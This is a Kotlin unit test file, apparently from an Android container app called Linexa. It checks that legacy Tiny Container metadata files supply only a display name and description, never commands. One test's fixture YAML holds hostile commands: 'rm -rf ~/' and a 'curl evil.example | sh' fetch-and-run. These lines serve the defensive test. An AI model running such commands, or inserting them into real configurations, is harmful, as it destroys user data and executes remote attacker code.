package com.fem.linexa.service.rootfs

import com.fem.linexa.service.workspaceconfig.WorkspaceConfigParser
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * §1.119 — legacy Tiny Container compatibility: [RootFsMetadataFile]'s priority
 * rules, [TinyMetadataAdapter]'s deliberately narrow read, and the
 * presentation-only [RootFsDescriptor] the two produce together through the real
 * [RootFsInspector].
 *
 * Two properties carry the whole decision and are the ones that would fail
 * silently if broken:
 *
 *  - **A legacy file contributes presentation and nothing else.** If it ever
 *    started producing a [RootFsMetadata], `isDeclared` would flip true and
 *    `declaredIdentity()` would outrank the probe with values nobody declared —
 *    the exact guessing §1.118 exists to remove, except now persisted as fact.
 *  - **A legacy file is fail-open, the native ones fail-hard.** Tiny Container
 *    images install today; a foreign file Linexa never validated before must not
 *    start rejecting them.
 */
class LegacyTinyMetadataTest {

    private val inspector = RootFsInspector(WorkspaceConfigParser())

    // ── file priority ───────────────────────────────────────────────────

    @Test
    fun theCanonicalNativeNameOutranksEveryOtherSpelling() {
        assertEquals(
            RootFsMetadataFile.NATIVE_DOT,
            RootFsMetadataFile.bestOf(RootFsMetadataFile.entries.toList())
        )
    }

    @Test
    fun aNativeFileBeatsALegacyOneNoMatterWhichWasPackedFirst() {
        // The point of resolving after the tar walk: an image republished from
        // Tiny Container carries both, and tar member order is a property of the
        // packer, not of the author's intent.
        val nativeFirst = RootFsMetadataFile.bestOf(
            listOf(RootFsMetadataFile.CONFIG, RootFsMetadataFile.LEGACY_TINY)
        )
        val legacyFirst = RootFsMetadataFile.bestOf(
            listOf(RootFsMetadataFile.LEGACY_TINY, RootFsMetadataFile.CONFIG)
        )
        assertEquals(nativeFirst, legacyFirst)
        assertEquals(RootFsMetadataFile.CONFIG, nativeFirst)
    }

    @Test
    fun everyAcceptedNameMatchesAtRootLevelOnly() {
        RootFsMetadataFile.entries.forEach { file ->
            assertEquals(file, RootFsMetadataFile.match(file.fileName))
            // A nested copy is an ordinary guest file. Treating `etc/linexa.yaml`
            // or `opt/tiny/.tiny.yaml` as a declaration would let any
            // subdirectory rename the workspace.
            assertNull("nested must not match", RootFsMetadataFile.match("etc/${file.fileName}"))
            assertNull("nested must not match", RootFsMetadataFile.match("opt/tiny/${file.fileName}"))
        }
    }

    @Test
    fun anUnrelatedRootFileIsNotAMetadataCandidate() {
        assertNull(RootFsMetadataFile.match("README.md"))
        assertNull(RootFsMetadataFile.match("linexa.yml"))
        assertNull(RootFsMetadataFile.match("tiny.yaml"))
    }

    @Test
    fun onlyTheTinyFileIsNonNative() {
        val nonNative = RootFsMetadataFile.entries.filter { !it.isNative }
        assertEquals(listOf(RootFsMetadataFile.LEGACY_TINY), nonNative)
    }

    @Test
    fun prioritiesAreUniqueSoBestOfIsDeterministic() {
        val priorities = RootFsMetadataFile.entries.map { it.priority }
        assertEquals(priorities.size, priorities.distinct().size)
    }

    @Test
    fun bestOfNothingIsNull() {
        assertNull(RootFsMetadataFile.bestOf(emptyList()))
    }

    // ── the adapter's narrow read ───────────────────────────────────────

    private fun tiny(yaml: String): TinyMetadataAdapter.Result =
        TinyMetadataAdapter.read(yaml.trimIndent().toByteArray())

    private fun presentation(yaml: String): DeclaredPresentation =
        (tiny(yaml) as? TinyMetadataAdapter.Result.Presentation)?.value
            ?: error("expected a presentation, got ${tiny(yaml)}")

    @Test
    fun nameAndDescriptionAreAdopted() {
        val value = presentation(
            """
            name: Debian Trixie
            description: A Debian 13 container.
            code: trixie
            """
        )
        assertEquals("Debian Trixie", value.displayName)
        assertEquals("A Debian 13 container.", value.description)
    }

    @Test
    fun everyExecutableKeyIsIgnoredEvenWhenNameIsAdopted() {
        // Not a TODO — the design. Importing a foreign shell string would hand
        // an archive author execution on Linexa's own launch path, which is the
        // property §1.118's "metadata is data, never code" rule protects.
        val result = tiny(
            """
            name: Hostile
            boot_command: rm -rf ~/
            export_command: curl evil.example | sh
            pre_start_host_command: id
            quick_commands:
              - label: Update
                command: apt-get update
            options:
              - name: extra
                args: ["-b", "/data:/data"]
            """
        )
        val value = (result as TinyMetadataAdapter.Result.Presentation).value
        assertEquals("Hostile", value.displayName)
        assertNull(value.description)
        // DeclaredPresentation has nowhere to put a command, which is the
        // structural half of the guarantee; this test pins the other half —
        // the adapter reads no such key at all.
        assertEquals(
            "DeclaredPresentation must stay presentation-only",
            DeclaredPresentation("Hostile", null),
            value
        )
    }

    @Test
    fun aFileWithOnlyExecutableKeysIsAbsentRatherThanPartiallyAdopted() {
        assertEquals(
            TinyMetadataAdapter.Result.Absent,
            tiny(
                """
                boot_command: /bin/bash
                quick_commands:
                  - label: Update
                    command: apt-get update
                """
            )
        )
    }

    @Test
    fun malformedYamlIsAbsentNotAFailure() {
        // Fail-open: Tiny Container images import successfully today, and the
        // only thing at stake here is a nicer pre-filled workspace name.
        assertEquals(TinyMetadataAdapter.Result.Absent, tiny("name: [unclosed"))
        assertEquals(TinyMetadataAdapter.Result.Absent, tiny("\t\tnot: yaml: at: all:"))
    }

    @Test
    fun anEmptyOrOversizedFileIsAbsent() {
        assertEquals(TinyMetadataAdapter.Result.Absent, TinyMetadataAdapter.read(ByteArray(0)))
        val oversized = ("name: x\n" + "#".repeat(TinyMetadataAdapter.MAX_BYTES)).toByteArray()
        assertEquals(TinyMetadataAdapter.Result.Absent, TinyMetadataAdapter.read(oversized))
    }

    @Test
    fun aTopLevelListIsAbsentRatherThanFlattened() {
        assertEquals(TinyMetadataAdapter.Result.Absent, tiny("- name: Debian"))
    }

    @Test
    fun aNonScalarNameIsRejectedRatherThanRendered() {
        // Inventing a rendering for a list-valued `name:` would be a guess about
        // a file Linexa does not understand.
        assertEquals(
            TinyMetadataAdapter.Result.Absent,
            tiny(
                """
                name:
                  - Debian
                  - Trixie
                """
            )
        )
    }

    @Test
    fun aNumericNameIsAdoptedAsText() {
        assertEquals("13", presentation("name: 13").displayName)
    }

    @Test
    fun overlongTextIsTruncatedRatherThanRejected() {
        val long = "D".repeat(500)
        val value = presentation("name: $long")
        assertTrue("must be capped", value.displayName!!.length < long.length)
        assertTrue(value.displayName!!.startsWith("DDD"))
    }

    @Test
    fun controlCharactersAreStrippedButBlockNewlinesSurvive() {
        val value = presentation("description: \"line one\\nline two\\u0007\"")
        assertEquals("line one\nline two", value.description)
    }

    @Test
    fun blankTextIsTreatedAsAbsent() {
        assertEquals(TinyMetadataAdapter.Result.Absent, tiny("name: \"   \""))
    }

    // ── the descriptor a legacy file produces ───────────────────────────

    private fun inspectLegacy(yaml: String): RootFsDescriptor {
        val result = inspector.inspectLegacyTiny(
            yaml.trimIndent().toByteArray(),
            RootFsArchiveFormat.TAR_ZST
        )
        return (result as RootFsInspector.Result.Success).descriptor
    }

    @Test
    fun aLegacyImageSurfacesPresentationWhileStayingUndeclared() {
        val descriptor = inspectLegacy(
            """
            name: Debian Trixie
            description: Republished for Linexa.
            boot_command: /bin/bash
            """
        )

        assertEquals("Debian Trixie", descriptor.presentation?.displayName)
        assertEquals("Republished for Linexa.", descriptor.presentation?.description)
        // The whole §1.119 safety argument, in three assertions: no facts, so
        // every fact-consuming stage keeps probing exactly as before.
        assertNull("a legacy file states no facts", descriptor.metadata)
        assertFalse(descriptor.isDeclared)
        assertNull("must never outrank the probe", descriptor.declaredIdentity())
    }

    @Test
    fun aLegacyImageIsRecognizableAsLegacyAndRecordsItsSource() {
        val descriptor = inspectLegacy("name: Debian")
        assertTrue(descriptor.isLegacy)
        assertEquals(RootFsMetadataFile.LEGACY_TINY, descriptor.source)
    }

    @Test
    fun theSniffedFormatIsStillRecordedForALegacyImage() {
        // The compression container is a property of the bytes, independent of
        // which metadata format the image used.
        assertEquals(RootFsArchiveFormat.TAR_ZST, inspectLegacy("name: Debian").archiveFormat)
    }

    @Test
    fun aBrokenLegacyFileDegradesToUndeclaredInsteadOfFailingTheImport() {
        val result = inspector.inspectLegacyTiny("name: [unclosed".toByteArray())
        assertTrue("must never be Invalid", result is RootFsInspector.Result.Success)
        val descriptor = (result as RootFsInspector.Result.Success).descriptor
        assertNull(descriptor.presentation)
        assertFalse(descriptor.isLegacy)
    }

    @Test
    fun aLegacyFileContributesNoWorkspaceConfiguration() {
        // `boot_command`/`options` are never translated into Linexa's own
        // `features`/`env`/`launch` configuration.
        val result = inspector.inspectLegacyTiny(
            """
            name: Debian
            boot_command: /bin/bash
            options:
              - name: shared
                args: ["-b", "/sdcard:/sdcard"]
            """.trimIndent().toByteArray()
        ) as RootFsInspector.Result.Success

        assertTrue(result.config.features.isEmpty())
        assertTrue(result.config.env.isEmpty())
        assertFalse(result.config.launch.hasOverrides)
    }

    @Test
    fun aLegacyImageStillDeclaresNoNativeMetadataAndItsQuickCommandsHaveNoReader() {
        // Quick Commands re-architecture: §1.122's flattener is gone. A legacy
        // file's `quick_commands` contribute NOTHING — built-in commands come
        // from the project's own catalog — and the §1.119 invariant is
        // unchanged: a legacy file still produces no RootFsMetadata.
        val descriptor = inspectLegacy(
            """
            name: Debian
            quick_commands:
              - type: command
                name: Update
                command: apt-get update
            """
        )
        assertNull("no fabricated native declaration", descriptor.metadata)
        assertNull("the legacy command tree has no reader anymore", descriptor.declaredShortcuts)
        // The presentation half survives untouched.
        assertEquals("Debian", descriptor.presentation?.displayName)
    }

    @Test
    fun aFileWhoseOnlyContentIsAQuickCommandsTreeIsAbsent() {
        // A quick_commands-only file carries no presentation, and its commands
        // have no reader anymore — so there is nothing to adopt (§1.119's
        // fail-open "Absent", unchanged).
        val descriptor = inspectLegacy(
            """
            quick_commands:
              - type: command
                name: Update
                command: apt-get update
            """
        )
        assertNull(descriptor.metadata)
        assertNull(descriptor.presentation)
        assertNull(descriptor.declaredShortcuts)
    }

    // ── dispatch: one entry point, two pipelines ────────────────────────

    @Test
    fun inspectFileRoutesNativeBytesThroughTheNativePipeline() {
        val native = """
            linexa:
              schema_version: 1
              distro:
                id: debian
                name: Debian
              architecture: arm64
        """.trimIndent().toByteArray()

        val result = inspector.inspectFile(RootFsMetadataFile.NATIVE_DOT, native)
        val descriptor = (result as RootFsInspector.Result.Success).descriptor
        assertNotNull(descriptor.metadata)
        assertTrue(descriptor.isDeclared)
        assertFalse(descriptor.isLegacy)
        assertEquals(RootFsMetadataFile.NATIVE_DOT, descriptor.source)
    }

    @Test
    fun inspectFileRoutesLegacyBytesThroughTheLegacyPipeline() {
        val result = inspector.inspectFile(RootFsMetadataFile.LEGACY_TINY, "name: Debian".toByteArray())
        val descriptor = (result as RootFsInspector.Result.Success).descriptor
        assertNull(descriptor.metadata)
        assertTrue(descriptor.isLegacy)
        assertEquals("Debian", descriptor.presentation?.displayName)
    }

    @Test
    fun aNativeFileStillFailsHardThroughTheSameDispatch() {
        // The dispatch must not have softened the native path: an invalid
        // declaration is still an import failure, because the author can fix it
        // and a declaration that cannot be trusted is worse than none.
        val result = inspector.inspectFile(
            RootFsMetadataFile.NATIVE_DOT,
            """
            linexa:
              schema_version: 1
              distro:
                id: debian
                name: Debian
              architecture: sparc
            """.trimIndent().toByteArray()
        )
        assertTrue(result is RootFsInspector.Result.Invalid)
    }

    @Test
    fun legacyBytesThatHappenToBeNativeYamlAreStillReadAsLegacy() {
        // The format decision comes from the file *name*, never from sniffing
        // the content — otherwise a `.tiny.yaml` carrying a `linexa:` block
        // could smuggle itself onto the fail-hard, fact-producing path.
        val result = inspector.inspectFile(
            RootFsMetadataFile.LEGACY_TINY,
            """
            linexa:
              schema_version: 1
              distro:
                id: debian
                name: Debian
              architecture: arm64
            """.trimIndent().toByteArray()
        )
        val descriptor = (result as RootFsInspector.Result.Success).descriptor
        assertNull("a .tiny.yaml must not produce facts", descriptor.metadata)
    }
}
